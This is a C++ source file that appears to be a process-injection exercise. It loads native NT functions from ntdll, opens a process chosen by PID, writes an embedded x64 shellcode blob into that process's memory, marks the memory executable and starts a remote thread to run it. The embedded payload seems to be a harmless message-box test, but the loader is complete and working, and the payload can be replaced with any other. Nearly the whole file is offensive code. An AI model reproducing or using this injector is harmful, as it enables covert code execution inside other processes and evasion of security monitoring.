
/* 

Watch this video https://www.youtube.com/watch?v=P1PHRcmPM7c ---> For Understanding the NTAPI 
https://medium.com/@apt0xAlp3a/process-injection-using-native-nt-apis-01b74be1a6e3
https://ntdoc.m417z.com/client_id

*/

#include <iostream>
#include <windows.h>

using namespace std;

typedef struct _OBJECT_ATTRIBUTES
{
    ULONG Length;
    HANDLE RootDirectory;
    struct _UNICODE_STRING *ObjectName;
    ULONG Attributes;
    PSECURITY_DESCRIPTOR SecurityDescriptor;
    PSECURITY_QUALITY_OF_SERVICE SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID
{
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef NTSTATUS(NTAPI* pNtOpenProcess)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId
    );

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
    );

typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
    );

typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtection,
    PULONG OldProtection
);

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
    );

typedef LONG NTSTATUS;
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

int main() {

unsigned char shellcode [] = 
 {"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
  "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
  "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
  "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
  "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
  "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
  "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
  "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
  "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
  "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
  "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
  "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
  "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
  "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
  "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
  "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
  "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
  "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
  "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
  "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
  "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
  "\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
  "\x2e\x2e\x5e\x3d\x00"};
    
    size_t shellcode_size = sizeof(shellcode);
    DWORD pid = 0;
    cout << "Enter Process ID (PID):" << endl;
    cin >> pid;

    HMODULE hntdll = GetModuleHandleA("ntdll.dll");

    pNtOpenProcess NtOpenProcess = (pNtOpenProcess)GetProcAddress(hntdll, "NtOpenProcess");
    pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hntdll, "NtAllocateVirtualMemory");
    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hntdll, "NtWriteVirtualMemory");
    pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(hntdll, "NtProtectVirtualMemory");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hntdll, "NtCreateThreadEx");

    CLIENT_ID clientId = { 0 };
    clientId.UniqueProcess = (HANDLE)pid;
    clientId.UniqueThread  = NULL;

    OBJECT_ATTRIBUTES oa = { 0 };
    oa.Length = sizeof(OBJECT_ATTRIBUTES);

    HANDLE hprocess = NULL;
    NTSTATUS status = NtOpenProcess(&hprocess, PROCESS_ALL_ACCESS, &oa, &clientId);

    PVOID allocate_memory = NULL;
    SIZE_T regionSize = shellcode_size;
    NTSTATUS AllocateStatus = NtAllocateVirtualMemory(hprocess, &allocate_memory, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    NTSTATUS WriteStatus = NtWriteVirtualMemory(hprocess, allocate_memory, shellcode, shellcode_size, NULL);

    ULONG old_protection = 0;
    SIZE_T protectSize = shellcode_size;
    NTSTATUS ProtectStatus = NtProtectVirtualMemory(hprocess, &allocate_memory, &protectSize, PAGE_EXECUTE_READ, &old_protection);

    HANDLE hRemoteThread = NULL;
    NTSTATUS CreateThreadStatus = NtCreateThreadEx(&hRemoteThread, THREAD_ALL_ACCESS, NULL, hprocess, allocate_memory, NULL, 0, 0, 0, 0, NULL);

    WaitForSingleObject(hRemoteThread, INFINITE);
    CloseHandle(hRemoteThread);

    return 0;
};